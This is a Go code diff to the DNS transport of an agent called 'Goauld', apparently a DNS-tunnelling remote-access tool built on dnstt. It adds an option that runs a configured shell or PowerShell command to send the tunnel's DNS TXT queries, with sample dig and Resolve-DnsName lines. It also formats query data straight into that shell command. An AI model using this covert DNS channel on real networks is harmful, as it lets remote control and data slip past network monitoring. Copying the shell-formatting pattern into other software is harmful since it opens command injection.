@@ -1,6 +1,7 @@
 package transport
 
 import (
+	"Goauld/agent/config"
 	"Goauld/common/log"
 	"bytes"
 	"crypto/rand"
@@ -9,6 +10,8 @@ import (
 	"fmt"
 	"io"
 	"net"
+	"os/exec"
+	"runtime"
 	"time"
 	"www.bamsoftware.com/git/dnstt.git/dns"
 	"www.bamsoftware.com/git/dnstt.git/turbotunnel"
@@ -186,22 +189,29 @@ func (c *DNSPacketConn) recvLoop(transport net.PacketConn) error {
 	for {
 		var buf [4096]byte
 		n, addr, err := transport.ReadFrom(buf[:])
-		if err != nil {
-			if err, ok := err.(net.Error); ok && err.Temporary() {
-				log.Debug().Str("Mode", "DNSSH").Msgf("ReadFrom temporary error: %v", err)
+		var payload []byte
+		if config.Get().GetDnsCommand() != "" {
+			payload, err = dns.DecodeRDataTXT(buf[:n])
+			if err != nil {
+				log.Trace().Err(err).Str("Mode", "DNSSH").Msg("error decoding payload")
 				continue
 			}
-			return err
+		} else {
+			if err != nil {
+				if err, ok := err.(net.Error); ok && err.Temporary() {
+					log.Debug().Str("Mode", "DNSSH").Msgf("ReadFrom temporary error: %v", err)
+					continue
+				}
+				return err
+			}
+			// Got a response. Try to parse it as a DNS message.
+			resp, err := dns.MessageFromWireFormat(buf[:n])
+			if err != nil {
+				log.Debug().Str("Mode", "DNSSH").Msgf("MessageFromWireFormat: %v", err)
+				continue
+			}
+			payload = dnsResponsePayload(&resp, c.domain)
 		}
-
-		// Got a response. Try to parse it as a DNS message.
-		resp, err := dns.MessageFromWireFormat(buf[:n])
-		if err != nil {
-			log.Debug().Str("Mode", "DNSSH").Msgf("MessageFromWireFormat: %v", err)
-			continue
-		}
-
-		payload := dnsResponsePayload(&resp, c.domain)
 
 		// Pull out the packets contained in the payload.
 		r := bytes.NewReader(payload)
@@ -313,6 +323,15 @@ func (c *DNSPacketConn) send(transport net.PacketConn, p []byte, addr net.Addr) 
 		return err
 	}
 
+	if config.Get().GetDnsCommand() != "" {
+		// If we rely on an external system command to perform the dns query, we get the result from the command
+		// And pass it to the recvloop using a mocked net.packetConn,
+		// where WriteTo data is directly available by ReadFrom method
+		res := DnsReq(name.String())
+		_, _ = transport.WriteTo(res, addr)
+		// We do not need to process further, as the data has already been transmitted
+		return nil
+	}
 	var id uint16
 	_ = binary.Read(rand.Reader, binary.BigEndian, &id)
 	query := &dns.Message{
@@ -343,6 +362,27 @@ func (c *DNSPacketConn) send(transport net.PacketConn, p []byte, addr net.Addr) 
 
 	_, err = transport.WriteTo(buf, addr)
 	return err
+}
+
+// DnsReq execute a system command that performs the DNS request
+// The system command is responsible for converting the request to raw bytes data
+func DnsReq(data string) []byte {
+	//cmd := exec.Command("powershell", "-c", fmt.Sprintf("(Resolve-DnsName -Type TXT -DnsOnly -Name %s -Server XXXXX).Strings", data))
+	//cmd := exec.Command("powershell", "-c", fmt.Sprintf("dig +short +unknownformat -t TXT '%s' @127.0.0.1 | head -n1 | cut -d ' ' -f3- | tr -d ' '  | xxd -r -p", data))
+	exe := "sh"
+	param := []string{"-c"}
+	if runtime.GOOS == "windows" {
+		exe = "powershell"
+		param = []string{"-NoProfile", "-NonInteractive"}
+	}
+	param = append(param, fmt.Sprintf(config.Get().GetDnsCommand(), data))
+	cmd := exec.Command(exe, param...)
+	res, err := cmd.Output()
+	if err != nil {
+		return nil
+	}
+	a := bytes.Trim(res, "\"")
+	return a
 }
 
 // sendLoop takes packets that have been written using c.WriteTo, and sends them
